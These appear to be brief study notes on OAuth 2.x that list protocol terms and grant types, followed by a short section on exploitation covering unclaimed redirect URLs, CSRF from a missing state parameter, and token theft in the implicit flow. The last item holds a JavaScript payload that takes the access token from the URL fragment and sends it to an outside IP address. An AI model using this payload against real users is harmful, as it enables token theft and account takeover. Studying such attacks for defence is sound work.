- https://oauth.net/2.1/

## Terms
- Resource Owner
- Client
- Authorization Server
- Resource Server
- Authorization Grant, primary grant types: 
	- `Authorization Code`
	- `Implicit`: improved by [authorization-code-flow-with-pkce](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce)
	- `Resource Owner Password Credentials`
	- `Client Credentials`
- Access Token
- Refresh Token
- Redirect URI
- Scope
- State parameters
- Token & Authorization Endpoint

## Exploitation
- Unclaimed redirect url: when a redirect url is registered that can be owned by the attacker
- CSRF in OAuth: without state parameter in the callback url, auth server doesn't know if the access token request is an ongoing request or malicious request
- Implicit grant flow: 
```js
<script>
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(
function (res, item) {
		var parts = item.split('=');res[parts[0]] = parts[1];
		return res; 
	},
	{}
); 

var accessToken = result.access_token;
var img = new Image(); 
img.src = 'http://10.2.18.222:8081/steal_token?token=' + accessToken; 
</script>
```